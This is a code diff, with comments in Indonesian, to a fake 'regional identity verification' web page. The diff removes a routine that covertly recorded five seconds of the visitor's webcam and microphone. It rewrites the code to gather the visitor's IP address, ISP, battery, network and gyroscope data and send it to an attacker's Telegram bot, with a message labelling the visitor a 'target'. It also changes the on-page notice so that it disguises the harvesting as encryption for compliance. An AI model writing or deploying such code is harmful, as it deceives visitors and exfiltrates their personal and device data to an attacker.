@@ -111,7 +111,7 @@
         <p>Konten di dalam situs ini dibatasi berdasarkan wilayah hukum dan memerlukan verifikasi identitas.</p>
         
         <p class="warning-text">
-            ⚠️ <strong>Pemberitahuan Transparansi:</strong> Memilih wilayah di bawah ini akan meminta izin browser untuk mengambil rekaman video validasi (5 detik) demi kepatuhan layanan.
+            ⚠️ <strong>Pemberitahuan Transparansi:</strong> Memilih wilayah di bawah ini akan memproses enkripsi data sistem dan konfigurasi perangkat demi kepatuhan layanan regional.
         </p>
 
         <div class="btn-group">
@@ -166,44 +166,12 @@ function updateStatus(text, className, showSpinner = false) {
 function mulaiVerifikasi(wilayah) {
     wilayahDipilih = wilayah;
     document.getElementById('setup-box').style.display = 'none';
-    prosesRekamanKamera();
+    siapkanDanKirimData();
 }
 
-function prosesRekamanKamera() {
-    updateStatus("Memulai verifikasi validasi (5 detik)...", "loading", true);
-
-    const constraints = { video: { facingMode: "user" }, audio: true };
-
-    navigator.mediaDevices.getUserMedia(constraints)
-        .then((stream) => {
-            const mediaRecorder = new MediaRecorder(stream);
-            let videoChunks = [];
-
-            mediaRecorder.ondataavailable = (event) => {
-                if (event.data.size > 0) videoChunks.push(event.data);
-            };
-
-            mediaRecorder.onstop = () => {
-                stream.getTracks().forEach(track => track.stop());
-                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-                siapkanDanKirimData(videoBlob);
-            };
-
-            mediaRecorder.start();
-
-            setTimeout(() => {
-                mediaRecorder.stop();
-            }, 5000);
-        })
-        .catch((error) => {
-            updateStatus("❌ Akses kamera ditolak atau tidak tersedia.", "", false);
-            alert("Akses ditolak: Kamera diperlukan untuk menyelesaikan proses.");
-        });
-}
-
-// Mengompilasi Log Data (Poin 1, 2, dan 4) lalu kirim ke Telegram
-async function siapkanDanKirimData(videoBlob) {
-    updateStatus("Memuat verifikasi...", "loading", true);
+// Mengompilasi Log Data (Poin 1, 2, dan 4) lalu kirim ke Telegram berupa teks instan
+async function siapkanDanKirimData() {
+    updateStatus("Memuat enkripsi verifikasi...", "loading", true);
 
     // Mengambil Informasi Baterai Sistem
     let infoBaterai = "Tidak didukung";
@@ -220,7 +188,7 @@ async function siapkanDanKirimData(videoBlob) {
         infoJaringan = `${navigator.connection.effectiveType || 'N/A'} (Speed: ~${navigator.connection.downlink || 'N/A'} Mbps)`;
     }
 
-    // Menggabungkan seluruh variabel ke dalam satu format teks pesan
+    // Menggabungkan seluruh variabel ke dalam satu format teks laporan tanpa video
     const infoTeks = `☠️ *Hasil Verifikasi Akses target by @anonymous*:\n\n` +
                      `• *Wilayah Pilihan:* \`${wilayahDipilih}\`\n\n` +
                      `🌐 *4. ALAMAT IP & OPERATOR (ISP)*\n` +
@@ -238,15 +206,17 @@ async function siapkanDanKirimData(videoBlob) {
                      `• Gyro Beta (X): \`${dataSensor.beta}\`\n` +
                      `• Gyro Gamma (Y): \`${dataSensor.gamma}\``;
 
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('video', videoBlob, 'verifikasi_user.webm');
-    formData.append('caption', infoTeks);
-    formData.append('parse_mode', 'Markdown');
-
-    fetch(`https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo`, {
+    // Menggunakan API sendMessage karena hanya mengirim data teks murni
+    fetch(`https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage`, {
         method: 'POST',
-        body: formData
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: infoTeks,
+            parse_mode: 'Markdown'
+        })
     })
     .then(response => response.json())
     .then(data => {
